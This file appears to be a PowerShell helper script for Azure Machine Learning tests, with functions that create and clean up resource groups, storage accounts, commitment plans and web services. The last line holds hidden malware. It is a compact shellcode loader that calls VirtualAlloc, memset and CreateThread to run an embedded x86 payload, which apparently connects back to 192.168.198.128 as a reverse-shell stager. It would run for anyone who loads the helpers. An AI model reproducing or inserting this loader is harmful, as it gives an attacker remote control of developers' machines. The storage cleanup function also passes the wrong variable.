














function Get-ResourceGroupName
{
    return getAssetName
}


function Get-TestStorageAccountName
{
    return getAssetName
}


function Get-CommitmentPlanName
{
    return getAssetName
}


function Get-WebServiceName
{
    return getAssetName
}


function Get-ProviderLocation($providerNamespace, $resourceType)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne `
        [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
    {
        $provider = Get-AzResourceProvider -ProviderNamespace $providerNamespace
        $resourceType = $provider.ResourceTypes | `
                        where {$_.ResourceTypeName -eq $resourceType}
          if ($resourceType -eq $null) 
        {  
            return "southcentralus"  
        } else 
        {  
            return $resourceType.Locations[0].Replace(" ", "").ToLowerInvariant()
        } 
    }

    return "southcentralus"
}


function Get-ProviderAPIVersion($providerNamespace, $resourceType)
{ 
    if ($providerNamespace -eq "Microsoft.MachineLearning")
    {
        if ([System.String]::Equals($resourceType, "commitmentPlans", `
            [System.StringComparison]::OrdinalIgnoreCase))
        {
            return "2016-05-01-preview"
        }

        if ([System.String]::Equals($resourceType, "webServices", `
            [System.StringComparison]::OrdinalIgnoreCase))
        {
            return "2017-01-01"
        }
    }

    return $null
}


function Create-TestStorageAccount($resourceGroup, $location, $storageName)
{
    New-AzStorageAccount -ResourceGroupName $resourceGroup -Name $storageName `
                                -Location $location -Type 'Standard_LRS' | Out-Null
    $accessKey = (Get-AzStorageAccountKey -ResourceGroupName $resourceGroup `
                                -Name $storageName).Key1;
    return @{ Name = $storageName; Key = $accessKey }
}


function Clean-CommitmentPlan($resourceGroup, $commitmentPlanName)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne `
        [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) 
    {
        try {
            LogOutput "Removing commitment plan $commitmentPlanName from resource group $rgName"    
            Remove-AzMlCommitmentPlan -ResourceGroupName $resourceGroup `
                                        -Name $commitmentPlanName -Force
            LogOutput "Commitment plan $commitmentPlanName was removed."
        }
        catch {
            Write-Warning "Caught unexpected exception when cleaning up commitment `
                            plan $commitmentPlanName in group $resourceGroup : `
                            $($($_.Exception).Message)"
        }
    }
}


function Clean-WebService($resourceGroup, $webServiceName)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne `
        [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) 
    {
        try {
            LogOutput "Removing web service $webServiceName from resource group $rgName"    
            Remove-AzMlWebService -ResourceGroupName $resourceGroup `
                                        -Name $webServiceName -Force
            LogOutput "Web service $webServiceName was removed."
        }
        catch {
            Write-Warning "Caught unexpected exception when cleaning up web `
                            service $webServiceName in group $resourceGroup : `
                            $($($_.Exception).Message)"
        }
    }
}


function Clean-TestStorageAccount($resourceGroup, $accountName)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne `
        [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) 
    {
        try {
            LogOutput "Removing storage account $accountName from resource group $rgName"             
            Remove-AzStorageAccount -ResourceGroupName $resourceGroup -Name $webServiceName
            LogOutput "Storage account $accountName was removed."
        }
        catch {
            Write-Warning "Caught unexpected exception when cleaning up `
                            storage account $accountName in group $resourceGroup : `
                            $($($_.Exception).Message)"
        }
    }
}


function Clean-ResourceGroup($resourceGroup)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne `
        [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
    {
        try {
            LogOutput "Removing resource group $resourceGroup" 
            Remove-AzResourceGroup -Name $resourceGroup -Force
            LogOutput "Resource group $resourceGroup was removed." 
        }
        catch {
            Write-Warning "Caught unexpected exception when cleaning up resource `
                            group $resourceGroup : $($($_.Exception).Message)"
        }
    }
}


function LogOutput($message)
{
    $timestamp = Get-Date -UFormat "%Y-%m-%d %H:%M:%S %Z"
    Write-Debug "[$timestamp]: $message"
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc6,0x80,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

